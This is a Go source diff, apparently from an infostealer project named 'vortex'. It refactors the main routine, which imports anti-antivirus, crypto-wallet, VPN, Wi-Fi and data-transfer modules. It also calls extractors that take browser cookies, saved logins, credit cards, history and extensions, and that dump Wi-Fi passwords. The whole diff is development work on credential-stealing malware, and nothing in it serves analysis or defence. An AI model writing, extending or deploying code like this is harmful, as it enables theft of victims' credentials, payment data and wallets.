@@ -4,10 +4,8 @@ import (
     "errors"
     "os"
     "path/filepath"
-    "runtime"
     "sync"
     "vortex/antiav"
-    "vortex/browser"
     "vortex/cryptowallets"
     "vortex/datatransfer"
     "vortex/envtype"
@@ -20,19 +18,6 @@ import (
     "vortex/vpn"
     "vortex/wifi"
 )
-
-func newBrowserDataExtractor() BrowserDataExtractor {
-    if runtime.GOOS == "windows" {
-        return &WindowsBrowserDataExtractor{}
-    } else if runtime.GOOS == "darwin" {
-        return &DarwinBrowserDataExtractor{}
-    } else if runtime.GOOS == "linux" {
-        return &LinuxBrowserDataExtractor{}
-    } else if runtime.GOOS == "js" {
-        return &MobileBrowserDataExtractor{}
-    }
-    return nil
-}
 
 func main() {
 
@@ -92,12 +77,13 @@ func main() {
         }
 
         // Chromium and Gecko based browsers
-        browserDataExtractor := newBrowserDataExtractor()
-        cookies, _ := browserDataExtractor.ExtractCookies("")
-        loginData, _ := browserDataExtractor.ExtractLoginData("")
-        creditCards, _ := browserDataExtractor.ExtractCreditCards("")
-        history, _ := browserDataExtractor.ExtractHistory("")
-        extensions, _ := browserDataExtractor.ExtractExtensions("")
+        if browserDataExtractor := newBrowserDataExtractor(); browserDataExtractor != nil {
+            _, _ = browserDataExtractor.ExtractCookies("")
+            _, _ = browserDataExtractor.ExtractLoginData("")
+            _, _ = browserDataExtractor.ExtractCreditCards("")
+            _, _ = browserDataExtractor.ExtractHistory("")
+            _, _ = browserDataExtractor.ExtractExtensions("")
+        }
 
         // Wifi Passwords
         if err = wifi.DumpWifiPasswords(mainFolder); err != nil {
